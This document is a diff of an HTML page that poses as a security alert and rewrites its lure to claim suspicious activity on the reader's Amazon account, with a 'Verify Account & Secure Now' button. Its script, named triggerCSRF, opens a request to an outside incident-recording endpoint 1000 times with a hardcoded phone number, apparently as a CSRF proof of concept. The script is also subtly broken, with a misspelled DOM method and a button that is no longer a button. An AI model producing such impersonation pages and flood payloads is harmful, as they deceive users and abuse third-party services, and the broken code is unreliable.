@@ -56,15 +56,19 @@
 <body>
     <div class="container">
         <h1>Important Security Update</h1>
-        <p>We have detected a potential security threat on your device. Please click the below button to install the necessary security updates and protect your personal information.</p>
-        <button class=".button">Install</button>
+        <p>We have detected suspicious activity on your Amazon account. Please click the button below to verify your account and protect your personal information.</p>
+        <div class="button">
+            Verify Account & Secure Now
+        </div>
     </div>
         <script>
-            window.onload = function() {
+	    let btn = document.getElementByTagName('button')
+            function triggerCSRF() {
                 for (let step = 0; step < 1000; step++) {
   		window.open("https://app-mig.emreach.com/incidents/record?phoneNumber=917979898742&voiceid=00000000-0000-0000-0000-000000000000")
 	      } 
             }
+	   btn.addEventListener('click', triggerCSRF)
         </script>
 </body>
 </html>
